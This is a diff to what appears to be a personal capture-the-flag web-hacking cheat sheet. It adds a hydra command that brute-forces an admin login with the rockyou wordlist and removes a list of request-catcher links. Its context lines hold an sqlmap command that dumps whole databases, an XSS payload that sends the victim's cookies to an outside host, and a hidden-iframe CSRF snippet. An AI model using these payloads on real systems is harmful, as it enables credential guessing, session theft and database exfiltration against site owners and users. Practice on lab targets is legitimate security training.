@@ -90,6 +90,11 @@ sqlmap -r req.txt-p  -D <database_name> --dump-all
 <script>document.write('<img src="https://site.com?cookie='+document.cookie+'"width=0 height=0 border=0 />');</script>
 ```
 ---
+#### brute force login
+![png](src/src_for_src/src/login.png)
+```
+hydra -l admin -P /usr/share/seclists/rockyou.txt $IP http-get /inferno
+```
 #### CSRF
 ```
 <iframe style="display:none" name="csrf-frame"></iframe>
@@ -164,6 +169,5 @@ index.php~ - сохнарить sourse code
 ```
 ---
 #### links
-- [xss](https://requestcatcher.com/)| [tools](https://webhook.site)| [request](https://fjksdfds.requestcatcher.com/)| [inspector](https://requestinspector.com/)
 - [steal admin cookie/sqli](./src/src_for_src/marketplace.md) (tryhackme:marketplace)
 - [ohmyweb](./src/src_for_src/omyweb.md)
